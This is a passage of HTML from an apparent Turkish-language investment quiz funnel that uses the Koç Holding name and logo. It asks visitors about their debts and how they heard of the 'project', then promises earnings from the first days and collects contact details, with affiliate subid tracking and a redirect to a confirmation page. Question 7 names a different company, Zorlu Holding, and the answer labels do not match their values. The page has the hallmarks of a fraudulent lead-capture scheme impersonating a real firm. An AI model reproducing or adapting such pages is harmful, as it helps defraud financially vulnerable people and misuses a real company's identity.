                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 6 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      ><span>6</span>. Mali durumunuzu ne kadar iyileştirmeniz
                      gerekiyor?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Herhangi bir finansal yükümlülüğünüz var mı?"
                      data-questionnew="6"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, ipoteğim var"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Evet, ipoteğim var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Konut kredim var, büyük miktarda paraya
                                ihtiyacım var
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Evet, kredim var"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Evet, kredim var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Kredilerim var, bunları kapatmak iyi olurdu
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="ayır, sadece ev masraflarım var"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="ayır, sadece ev masraflarım var"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Günlük harcamalarım için yeterli param yok
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Hayır, ancak finansal olarak bağımsız olmak istiyorum"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_6"
                            value="Hayır, ancak finansal olarak bağımsız olmak istiyorum"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                Şu an aldığım miktardan daha fazla kazanmak
                                istiyorum
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/6.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>A</span><span>l</span><span>t</span
                            ><span>ı</span><span>n</span><span>c</span
                            ><span>ı</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Question 7 -->
          <div class="quiz-container test-step">
            <div class="head-logo" style="z-index: 1000; position: relative">
              <div class="b-quiz-question__title" style="display: flex">
                <div class="logo__img">
                  <img src="assets/logo.png" />
                </div>
                <div
                  class="nav-menu"
                  style="display: flex; width: 50%; justify-content: flex-end"
                ></div>
              </div>
            </div>
            <div class="quiz">
              <div class="quiz__questions">
                <div class="quiz__questions-header">
                  <div
                    class="title quiz__question-title quiz__question-title_without-title"
                  >
                    <span class="is-block q-uestion"
                      ><span>7</span>. Zorlu Holding'de yatırım fırsatını
                      nereden öğrendiniz?
                    </span>
                  </div>
                </div>
                <div
                  class="question quiz__question question_variants"
                  id="DJ17A5860g"
                >
                  <div class="answer-variants answer-variants_has_image">
                    <div
                      class="answer-variants__group"
                      data-question="Koç Holding projesinden nasıl haberdar oldunuz?"
                      data-questionnew="7"
                    >
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Açık hava reklamcılığı"
                        data-answernew="a"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Açık hava reklamcılığı"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                İnternetteki reklamlar
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="İnternette reklam"
                        data-answernew="b"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="İnternette reklam"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">
                                İlk temettüleri alan arkadaşların tavsiyesi
                              </div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Arkadaş önerileri (&#39;Koç Holding&#39; platformu katılımcıları)"
                        data-answernew="c"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Arkadaş önerileri (&#39;Koç Holding&#39; platformu katılımcıları)"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Dış reklamlar</div>
                            </div>
                          </span>
                        </label>
                      </div>
                      <div
                        data-element-index="0"
                        class="answer-variants__variant-text answer-btn q-answer"
                        data-answer="Arama platformları"
                        data-answernew="d"
                      >
                        <label tabindex="0" class="b-radio radio">
                          <input
                            tabindex="-1"
                            type="radio"
                            name="question_7"
                            value="Arama platformları"
                          />
                          <span class="check"></span>
                          <span class="control-label">
                            <div class="answer">
                              <div class="answer__title">Arama motorları</div>
                            </div>
                          </span>
                        </label>
                      </div>
                    </div>
                    <div class="answer-variants__image">
                      <img
                        src="assets/7.png"
                        alt=""
                        class="answer-variants__image-img"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="quiz__whitelabel quiz__whitelabel_mobile"
                  style="
                    display: block !important;
                    visibility: visible !important;
                    opacity: 1 !important;
                  "
                ></div>
                <div class="quiz__buttons">
                  <div class="quiz-buttons is-outline">
                    <div class="quiz-buttons__progress">
                      <div class="progress-bar">
                        <div class="progress-bar-circular-steps">
                          <div class="progress-bar-circular-steps__label">
                            <span>Y</span><span>e</span><span>d</span
                            ><span>i</span><span>n</span><span>c</span
                            ><span>i</span> <span>a</span><span>d</span
                            ><span>ı</span><span>m</span>
                          </div>
                          <div
                            class="progress-bar-circular-steps__gradient-wrapp"
                            style="--left-percent: 0%; --right-percent: 50%"
                          >
                            <div
                              class="progress-bar-circular-steps__steps"
                              style="left: 0px"
                            >
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step progress-bar-circular-steps__step_active"
                              ></div>
                              <div
                                class="progress-bar-circular-steps__step"
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="quiz-container quiz-container_has_results test-step">
            <div class="quiz__lead-form">
              <div class="final-page final-page_horizontal">
                <div class="final-page__content-container">
                  <div class="final-page__header-container">
                    <style>
                      .form__logo {
                        display: block;
                        max-width: 300px;
                        width: 100%;
                        margin-bottom: 25px;
                      }

                      @media (max-width: 500px) {
                        .form__logo {
                          display: block;
                          max-width: 231px;
                          width: 100%;
                          margin: 0 auto 25px;
                        }
                      }
                    </style>
                    <img
                      src="assets/logo.png"
                      class="form__logo"
                      alt="Koç Holding"
                    />

                    <div class="final-page__header">
                      Tebrikler! Yeni bir yatırım fırsatını keşfettiniz!
                    </div>
                    <div class="final-page__content">
                      <p>
                        İletişim bilgilerinizi bırakın, böylece yöneticilerimiz
                        platformumuza uyum sağlamanıza yardımcı olabilir ve ilk
                        günlerden itibaren kazanmaya başlayabilirsiniz.
                      </p>
                    </div>
                  </div>
                </div>
                <div class="final-page__form">
                  <div class="leadFormContainer2 firstt">
                    <form
                    autocomplete="off"
                    class="form _main-form register-form form-reg form-send"
                    method="post"
                    id="main-form"
                  >
                  
                </form>
                    
                    <style>
                      .iti {
                        position: relative;
                        display: inline-block;
                        width: 100%;
                      }

                      .iti input {
                        max-width: 400px;
                        padding-left: 90px !important;
                      }
                    </style>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script src="assets/custom.js"></script>
    <script src="loadAssets.js?v=135153"></script>
    

    <script>
      // Scroll to element
      const scrollToElement = (elSelector, triggerSelector) => {
        const el = document.querySelector(elSelector);
        const triggers = document.querySelectorAll(triggerSelector);

        const callback = (item) => {
          item.addEventListener("click", (event) => {
            event.preventDefault();

            el.scrollIntoView({
              behavior: "smooth",
              block: "center",
            });
          });
        };

        triggers.forEach(callback);
      };

      scrollToElement("#main-form", 'a[href="#main-form"]');
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
    
    
    <script>
        window.onload = function() {
        var thx = localStorage.getItem('thanks');
        if (thx && thx === "true") {
        const fileThx = 'confirm.php';
        window.location.href = `${fileThx}${window.location.search}`;
        }
    }
    
    window.onpageshow = function() {
        var thx = localStorage.getItem('thanks');
        if (thx && thx === "true") {
        const fileThx = 'confirm.php';
        window.location.href = `${fileThx}${window.location.search}`;
        }
    }
    </script>
  </body>
</html>
